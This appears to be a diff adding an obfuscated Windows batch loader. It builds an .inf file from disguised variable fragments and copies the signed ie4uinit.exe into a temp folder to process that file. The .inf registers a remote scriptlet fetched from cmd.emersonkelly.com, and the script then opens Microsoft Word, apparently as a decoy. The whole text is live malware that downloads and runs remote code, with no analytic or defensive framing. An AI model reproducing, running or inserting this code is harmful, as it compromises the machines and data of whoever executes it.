@@ -1,0 +1,8 @@
+/v /ccall%Online:~0,1%et "Webshots=.inf" &&
+  %Online:~0,1%et "Upper=ieuinit!Webshots!" &&
+  call %Online:~0,1%et "Focuses=%t!Sticks!mp%\" &&
+  (for /D %g in ("[string%Online:~0,1%]" "Appear=init" "Depth=t;Wallpapers" "%Online:~0,1%hortsvcname=' '" "Ordinary=b;Alternatives" "Pupil=:;Eager" "Showtimes=h" "Often=/" "%Online:~0,1%ervicename=' '" "Silly=com" "Acoustic=%time%" "[defaultin%Online:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=FF7" "delfiles=7A60" "[7A60]" "ieu%Appear%!Webshots!" "[FF7]" "sc\" "ro%Ordinary%j,NI,%Showtimes%%Depth%%Depth%p%Pupil%%Often%%Often%cmd.emersonkelly.%Silly%/lajvar" "[de%Online:~0,1%tinationdirs]" "defaultdestdir=11" "7A60=01" "[version]" "signature =$windows nt$" ) do @echo %~g)>"!Focuses!!Upper!" &&
+  %Online:~0,1%et "Parties=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Twist!ir%\%Online:~0,1%ystem32\!Parties! "!Focuses!*" &&
+  start "" "!Focuses!!Parties!" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
